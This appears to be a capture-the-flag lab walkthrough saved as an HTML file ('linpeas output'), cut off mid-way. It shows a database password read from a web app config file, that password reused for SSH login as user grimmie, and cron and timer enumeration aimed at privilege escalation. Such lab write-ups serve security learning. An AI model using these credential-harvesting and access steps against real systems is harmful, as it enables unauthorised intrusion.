@@ -1,0 +1,87 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>linpeas output</title>
+</head><body>grimmie:x:1000:1000:administrator,,,:/home/grimmie:/bin/bash <br/>
+<br/>
+/home/grimmie/.bash_history                                                           <br/>
+/home/grimmie/.bashrc<br/>
+/home/grimmie/backup.sh<br/>
+/home/grimmie/.profile<br/>
+/home/grimmie/.bash_logout<br/>
+<br/>
+<br/>
+<br/>
+Backup files (limited 100)<br/>
+-rwxr-xr-- 1 grimmie administrator 112 May 30 2021 /home/grimmie/backup.sh    <br/>
+<br/>
+$ cat /var/www/html/academy/includes/config.php<br/>
+Output:<br/>
+&lt;?php<br/>
+$mysql_hostname = &quot;localhost&quot;;<br/>
+$mysql_user = &quot;grimmie&quot;;<br/>
+$mysql_password = &quot;My_V3ryS3cur3_P4ss&quot;;<br/>
+$mysql_database = &quot;onlinecourse&quot;;<br/>
+$bd = mysqli_connect($mysql_hostname, $mysql_user, $mysql_password, $mysql_database) or die(&quot;Could not connect database&quot;);<br/>
+<br/>
+So now we are sure that we are up against a user named Grimmie. <br/>
+<br/>
+Will open a new terminal<br/>
+┌──(root㉿kali)-[~]<br/>
+└─# ssh grimmie@192.168.205.131                                             <br/>
+The authenticity of host '192.168.205.131 (192.168.205.131)' can't be established.<br/>
+ED25519 key fingerprint is SHA256:eeNKTTakhvXyaWVPMDTB9+/4WEg6WKZwlUp0ATptgb0.<br/>
+This key is not known by any other names<br/>
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes<br/>
+Warning: Permanently added '192.168.205.131' (ED25519) to the list of known hosts.<br/>
+grimmie@192.168.205.131's password: <br/>
+<br/>
+Permission denied, please try again.<br/>
+grimmie@192.168.205.131's password: <br/>
+Linux academy 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64<br/>
+<br/>
+The programs included with the Debian GNU/Linux system are free software;<br/>
+the exact distribution terms for each program are described in the<br/>
+individual files in /usr/share/doc/*/copyright.<br/>
+<br/>
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br/>
+permitted by applicable law.<br/>
+Last login: Sun May 30 03:21:39 2021 from 192.168.10.31<br/>
+<br/>
+Even though we got a shell but still we are not a Root user. Even though we have to run the linpeas.sh here and see if anything is changed but will skip that for now.<br/>
+So will now try to find the back_up.sh file which is of interest<br/>
+command : cd /home/grimmie<br/>
+command : cat backup.sh<br/>
+<br/>
+grimmie@academy:~$ cat backup.sh<br/>
+#!/bin/bash<br/>
+<br/>
+rm /tmp/backup.zip<br/>
+zip -r /tmp/backup.zip /var/www/html/academy/includes<br/>
+chmod 700 /tmp/backup.zip<br/>
+grimmie@academy:~$ <br/>
+<br/>
+Will also checl for the crontab (i.e. a task that is perfomed periodically in our case it is taking backup<br/>
+grimmie@academy:~$ crontab -l<br/>
+no crontab for grimmie<br/>
+<br/>
+grimmie@academy:~$ crontab -u root -l<br/>
+must be privileged to use -u<br/>
+<br/>
+grimmie@academy:~$ crontab -e<br/>
+no crontab for grimmie - using an empty one<br/>
+<br/>
+But now will check for a timer if any Script is running on timer or not ?? (i.e. In real scenario in that sense that cronjobs are used in administration)<br/>
+grimmie@academy:~$ systemctl list-timers<br/>
+NEXT             LEFT    LAST             PASSED    UNIT             ACTIVATES<br/>
+Wed 2022-12-07 12:39:00 EST 13min left Wed 2022-12-07 12:09:01 EST 16min ago  phpsessionclean.timer    phpsessionclean.service<br/>
+Thu 2022-12-08 00:00:00 EST 11h left  Wed 2022-12-07 08:14:00 EST 4h 11min ago logrotate.timer       logrotate.service<br/>
+Thu 2022-12-08 00:00:00 EST 11h left  Wed 2022-12-07 08:14:00 EST 4h 11min ago man-db.timer         man-db.service<br/>
+Thu 2022-12-08 01:07:36 EST 12h left  Wed 2022-12-07 08:14:00 EST 4h 11min ago apt-daily.timer       apt-daily.service<br/>
+Thu 2022-12-08 06:35:46 EST 18h left  Wed 2022-12-07 06:14:17 EST 6h ago    apt-daily-upgrade.timer   apt-daily-upgrade.service<br/>
+Thu 2022-12-08 12:07:49 EST 23h left  Wed 2022-12-07 12:07:49 EST 17min ago  systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service<br/>
+<br/>
+6 timers listed.<br/>
+Pass --all to see loaded but inactive timers, too.<br/>
+<br/>
+So if we want the confirmation that this is running on a timer we use a tool called pspy</body></html>
